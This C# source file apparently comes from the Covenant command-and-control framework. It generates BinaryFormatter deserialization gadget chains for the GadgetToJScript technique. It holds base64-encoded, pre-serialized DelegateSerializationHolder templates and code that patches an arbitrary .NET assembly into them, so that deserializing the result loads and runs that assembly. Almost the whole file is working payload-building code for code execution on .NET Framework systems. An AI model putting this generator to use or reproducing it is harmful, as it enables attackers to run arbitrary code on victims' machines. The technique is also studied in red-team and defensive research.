// Author: Ryan Cobb (@cobbr_io), modified for GadgetToJScript support
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3
//
// GadgetToJScript technique based on https://github.com/med0x2e/GadgetToJScript
// Generates serialized gadget chains for BinaryFormatter deserialization attacks

using System;
using System.IO;
using System.Text;
using System.Linq;

namespace Covenant.Core
{
    /// <summary>
    /// Generates BinaryFormatter serialized gadget chains for code execution.
    /// Uses the DelegateSerializationHolder approach which is compatible with
    /// .NET Framework 3.5 through 4.8 on Windows 7 through Windows 10+.
    /// </summary>
    public static class GadgetGenerator
    {
        /// <summary>
        /// Generate a BinaryFormatter serialized payload using the DelegateSerializationHolder gadget.
        /// This creates a Converter delegate that calls Assembly.Load when DynamicInvoke is called.
        /// </summary>
        /// <param name="assemblyBytes">The .NET assembly to embed in the payload</param>
        /// <returns>Serialized delegate bytes that can be deserialized and invoked</returns>
        public static byte[] GenerateDelegate(byte[] assemblyBytes)
        {
            return BuildDelegateGadget(assemblyBytes);
        }

        /// <summary>
        /// Builds a DelegateSerializationHolder gadget.
        ///
        /// The pre-serialized template contains a Converter&lt;byte[], Assembly&gt; delegate
        /// that wraps Assembly.Load(byte[]). The template has a placeholder for the assembly
        /// bytes which we patch at runtime.
        ///
        /// Structure of the serialized data:
        /// - FrontBinaryFormattedDelegate: Everything up to and including the array length field
        /// - Assembly bytes: The .NET assembly to load
        /// - EndBinaryFormattedDelegate: The rest of the serialized structure
        ///
        /// When deserialized:
        /// 1. BinaryFormatter reconstructs the DelegateSerializationHolder
        /// 2. The delegate points to Assembly.Load(byte[])
        /// 3. Calling DynamicInvoke(null) on the delegate loads the assembly
        /// 4. The loaded assembly can then be used to create instances
        /// </summary>
        private static byte[] BuildDelegateGadget(byte[] assemblyBytes)
        {
            // Decode the pre-serialized delegate template
            byte[] front = Convert.FromBase64String(FrontBinaryFormattedDelegate);
            byte[] end = Convert.FromBase64String(EndBinaryFormattedDelegate);

            // The FrontBinaryFormattedDelegate ends with the BinaryFormatter's ArraySinglePrimitive record:
            // [RecordType=0x0F][ObjectId][ArrayLength:4bytes][ElementType=0x02 for byte]
            // We need to patch the ArrayLength field to match our assembly size
            int lengthPosition = front.Length - 5;
            byte[] lengthBytes = BitConverter.GetBytes(assemblyBytes.Length);
            front[lengthPosition] = lengthBytes[0];
            front[lengthPosition + 1] = lengthBytes[1];
            front[lengthPosition + 2] = lengthBytes[2];
            front[lengthPosition + 3] = lengthBytes[3];

            // Concatenate: patched front + assembly bytes + end
            return front.Concat(assemblyBytes).Concat(end).ToArray();
        }

        // Pre-serialized DelegateSerializationHolder template.
        // This was created on .NET Framework and contains a Converter<byte[], Assembly> delegate
        // that wraps Assembly.Load(byte[], byte[]).
        //
        // The template structure:
        // - SerializationHeaderRecord
        // - BinaryObject for DelegateSerializationHolder
        // - MemberInfo records for the delegate
        // - ArraySinglePrimitive header (ends with length field we patch)
        private static string FrontBinaryFormattedDelegate = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyBAAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDAHbWV0aG9kMQMHAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkCAAAACQMAAAAJBAAAAAkFAAAABAIAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGBgAAANoBU3lzdGVtLkNvbnZlcnRlcmAyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GBwAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGCAAAAAd0YXJnZXQwCQcAAAAGCgAAABpTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseQYLAAAABExvYWQJDAAAAA8DAAAAACQAAAI=";

        // End of the serialized delegate template.
        // Contains the MemberInfoSerializationHolder records that complete the delegate structure.
        private static string EndBinaryFormattedDelegate = "BAQAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQsAAAAJBwAAAAkKAAAABhAAAAAvU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10sIEJ5dGVbXSkGEQAAAD1TeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10sIFN5c3RlbS5CeXRlW10pCAAAAAoBBQAAAAQAAAAGEgAAAAhUb1N0cmluZwkHAAAABhQAAAAOU3lzdGVtLkNvbnZlcnQGFQAAACVTeXN0ZW0uU3RyaW5nIFRvU3RyaW5nKFN5c3RlbS5PYmplY3QpBhYAAAAlU3lzdGVtLlN0cmluZyBUb1N0cmluZyhTeXN0ZW0uT2JqZWN0KQgAAAAKAQwAAAACAAAABhcAAAAvU3lzdGVtLlJ1bnRpbWUuUmVtb3RpbmcuTWVzc2FnaW5nLkhlYWRlckhhbmRsZXIJBwAAAAoJBwAAAAkUAAAACRIAAAAKCw==";
    }
}
